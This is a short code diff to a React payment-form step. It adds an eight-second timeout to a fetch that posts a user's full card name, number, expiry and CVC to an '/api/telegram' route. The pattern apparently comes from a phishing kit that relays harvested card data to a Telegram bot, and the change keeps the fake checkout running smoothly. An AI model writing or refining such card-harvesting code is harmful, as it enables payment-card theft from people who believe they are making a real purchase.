@@ -231,11 +231,15 @@ function Step3({ onNext, onBack, step2Data }: { onNext: (txId: string) => void; 
   const handleConfirm = async () => {
     if (!validate()) return;
     setLoading(true);
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 8000);
     const res = await fetch("/api/telegram", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ type: "card", ...step2Data, cardName: card.name, cardNumber: card.number, expiry: card.expiry, cvc: card.cvc }),
+      signal: controller.signal,
     }).catch(() => null);
+    clearTimeout(timeout);
     const data = res ? await res.json().catch(() => ({})) : {};
     setLoading(false);
     onNext(data.transactionId || "");
